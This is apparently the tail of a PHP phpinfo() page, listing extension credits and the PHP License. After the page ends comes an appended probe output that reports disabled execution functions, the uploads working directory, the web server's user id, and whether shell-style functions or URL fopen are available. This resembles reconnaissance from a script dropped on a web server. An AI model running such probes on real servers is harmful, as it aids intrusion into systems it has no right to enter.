                    <td class="v">Stig Bakken, Thies C. Arntzen, Andy Sautins, David Benson, Maxim Maletsky, Harald Radi, Antony Dovgal, Andi Gutmans, Wez Furlong, Christopher Jones, Oracle Corporation </td>
                </tr>
                <tr>
                    <td class="e">ODBC driver for PDO </td>
                    <td class="v">Wez Furlong </td>
                </tr>
                <tr>
                    <td class="e">ODBC </td>
                    <td class="v">Stig Bakken, Andreas Karajannis, Frank M. Kromann, Daniel R. Kalowsky </td>
                </tr>
                <tr>
                    <td class="e">Opcache </td>
                    <td class="v">Andi Gutmans, Zeev Suraski, Stanislav Malyshev, Dmitry Stogov, Xinchen Hui </td>
                </tr>
                <tr>
                    <td class="e">OpenSSL </td>
                    <td class="v">Stig Venaas, Wez Furlong, Sascha Kettler, Scott MacVicar, Eliot Lear </td>
                </tr>
                <tr>
                    <td class="e">Oracle (OCI) driver for PDO </td>
                    <td class="v">Wez Furlong </td>
                </tr>
                <tr>
                    <td class="e">pcntl </td>
                    <td class="v">Jason Greene, Arnaud Le Blanc </td>
                </tr>
                <tr>
                    <td class="e">Perl Compatible Regexps </td>
                    <td class="v">Andrei Zmievski </td>
                </tr>
                <tr>
                    <td class="e">PHP Archive </td>
                    <td class="v">Gregory Beaver, Marcus Boerger </td>
                </tr>
                <tr>
                    <td class="e">PHP Data Objects </td>
                    <td class="v">Wez Furlong, Marcus Boerger, Sterling Hughes, George Schlossnagle, Ilia Alshanetsky </td>
                </tr>
                <tr>
                    <td class="e">PHP hash </td>
                    <td class="v">Sara Golemon, Rasmus Lerdorf, Stefan Esser, Michael Wallner, Scott MacVicar </td>
                </tr>
                <tr>
                    <td class="e">Posix </td>
                    <td class="v">Kristian Koehntopp </td>
                </tr>
                <tr>
                    <td class="e">PostgreSQL driver for PDO </td>
                    <td class="v">Edin Kadribasic, Ilia Alshanetsky </td>
                </tr>
                <tr>
                    <td class="e">PostgreSQL </td>
                    <td class="v">Jouni Ahto, Zeev Suraski, Yasuo Ohgaki, Chris Kings-Lynne </td>
                </tr>
                <tr>
                    <td class="e">Pspell </td>
                    <td class="v">Vlad Krupin </td>
                </tr>
                <tr>
                    <td class="e">Readline </td>
                    <td class="v">Thies C. Arntzen </td>
                </tr>
                <tr>
                    <td class="e">Reflection </td>
                    <td class="v">Marcus Boerger, Timm Friebe, George Schlossnagle, Andrei Zmievski, Johannes Schlueter </td>
                </tr>
                <tr>
                    <td class="e">Sessions </td>
                    <td class="v">Sascha Schumann, Andrei Zmievski </td>
                </tr>
                <tr>
                    <td class="e">Shared Memory Operations </td>
                    <td class="v">Slava Poliakov, Ilia Alshanetsky </td>
                </tr>
                <tr>
                    <td class="e">SimpleXML </td>
                    <td class="v">Sterling Hughes, Marcus Boerger, Rob Richards </td>
                </tr>
                <tr>
                    <td class="e">SNMP </td>
                    <td class="v">Rasmus Lerdorf, Harrie Hazewinkel, Mike Jackson, Steven Lawrance, Johann Hanne, Boris Lytochkin </td>
                </tr>
                <tr>
                    <td class="e">SOAP </td>
                    <td class="v">Brad Lafountain, Shane Caraveo, Dmitry Stogov </td>
                </tr>
                <tr>
                    <td class="e">Sockets </td>
                    <td class="v">Chris Vandomelen, Sterling Hughes, Daniel Beulshausen, Jason Greene </td>
                </tr>
                <tr>
                    <td class="e">Sodium </td>
                    <td class="v">Frank Denis </td>
                </tr>
                <tr>
                    <td class="e">SPL </td>
                    <td class="v">Marcus Boerger, Etienne Kneuss </td>
                </tr>
                <tr>
                    <td class="e">SQLite 3.x driver for PDO </td>
                    <td class="v">Wez Furlong </td>
                </tr>
                <tr>
                    <td class="e">SQLite3 </td>
                    <td class="v">Scott MacVicar, Ilia Alshanetsky, Brad Dewar </td>
                </tr>
                <tr>
                    <td class="e">System V Message based IPC </td>
                    <td class="v">Wez Furlong </td>
                </tr>
                <tr>
                    <td class="e">System V Semaphores </td>
                    <td class="v">Tom May </td>
                </tr>
                <tr>
                    <td class="e">System V Shared Memory </td>
                    <td class="v">Christian Cartus </td>
                </tr>
                <tr>
                    <td class="e">tidy </td>
                    <td class="v">John Coggeshall, Ilia Alshanetsky </td>
                </tr>
                <tr>
                    <td class="e">tokenizer </td>
                    <td class="v">Andrei Zmievski, Johannes Schlueter </td>
                </tr>
                <tr>
                    <td class="e">XML </td>
                    <td class="v">Stig Bakken, Thies C. Arntzen, Sterling Hughes </td>
                </tr>
                <tr>
                    <td class="e">XMLReader </td>
                    <td class="v">Rob Richards </td>
                </tr>
                <tr>
                    <td class="e">XMLWriter </td>
                    <td class="v">Rob Richards, Pierre-Alain Joye </td>
                </tr>
                <tr>
                    <td class="e">XSL </td>
                    <td class="v">Christian Stocker, Rob Richards </td>
                </tr>
                <tr>
                    <td class="e">Zip </td>
                    <td class="v">Pierre-Alain Joye, Remi Collet </td>
                </tr>
                <tr>
                    <td class="e">Zlib </td>
                    <td class="v">Rasmus Lerdorf, Stefan Roehrich, Zeev Suraski, Jade Nicoletti, Michael Wallner </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th colspan="2">PHP Documentation</th>
                </tr>
                <tr>
                    <td class="e">Authors </td>
                    <td class="v">Mehdi Achour, Friedhelm Betz, Antony Dovgal, Nuno Lopes, Hannes Magnusson, Philip Olson, Georg Richter, Damien Seguy, Jakub Vrana, Adam Harvey </td>
                </tr>
                <tr>
                    <td class="e">Editor </td>
                    <td class="v">Peter Cowburn </td>
                </tr>
                <tr>
                    <td class="e">User Note Maintainers </td>
                    <td class="v">Daniel P. Brown, Thiago Henrique Pojda </td>
                </tr>
                <tr>
                    <td class="e">Other Contributors </td>
                    <td class="v">Previously active authors, editors and other contributors are listed in the manual. </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th>PHP Quality Assurance Team</th>
                </tr>
                <tr>
                    <td class="e">Ilia Alshanetsky, Joerg Behrens, Antony Dovgal, Stefan Esser, Moriyoshi Koizumi, Magnus Maatta, Sebastian Nohn, Derick Rethans, Melvyn Sopacua, Pierre-Alain Joye, Dmitry Stogov, Felipe Pena, David Soria Parra, Stanislav Malyshev, Julien Pauli, Stephen Zarkos, Anatol Belski, Remi Collet, Ferenc Kovacs </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th colspan="2">Websites and Infrastructure team</th>
                </tr>
                <tr>
                    <td class="e">PHP Websites Team </td>
                    <td class="v">Rasmus Lerdorf, Hannes Magnusson, Philip Olson, Lukas Kahwe Smith, Pierre-Alain Joye, Kalle Sommer Nielsen, Peter Cowburn, Adam Harvey, Ferenc Kovacs, Levi Morrison </td>
                </tr>
                <tr>
                    <td class="e">Event Maintainers </td>
                    <td class="v">Damien Seguy, Daniel P. Brown </td>
                </tr>
                <tr>
                    <td class="e">Network Infrastructure </td>
                    <td class="v">Daniel P. Brown </td>
                </tr>
                <tr>
                    <td class="e">Windows Infrastructure </td>
                    <td class="v">Alex Schoenmaker </td>
                </tr>
            </table>
            <table>
                <tr class="h">
                    <th colspan="1">Debian Packaging</th>
                </tr>
                <tr>
                    <td class="e">Ondřej Surý </td>
                </tr>
            </table>
            <h2>PHP License</h2>
            <table>
                <tr class="v">
                    <td>
                        <p>This program is free software; you can redistribute it and/or modify it under the terms of the PHP License as published by the PHP Group and included in the distribution in the file:  LICENSE
</p>
                        <p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
</p>
                        <p>If you did not receive a copy of the PHP license, or have any questions about PHP licensing, please contact license@php.net.
</p>
                    </td>
                </tr>
            </table>
        </div>
    </body>
</html>
<h3>disabled functions</h3>
exec, shell_exec, system, proc_open, popen, curl_exec, curl_multi_exec<br>
<h3>working dir & perms</h3>
cwd: /var/www/html/uploads<br>
uid: 33 gid: 33<br>
<h3>can exec /proc?</h3>
can proc_open? no<br>
can shell_exec? no<br>
allow_url_fopen: 1<br>

```

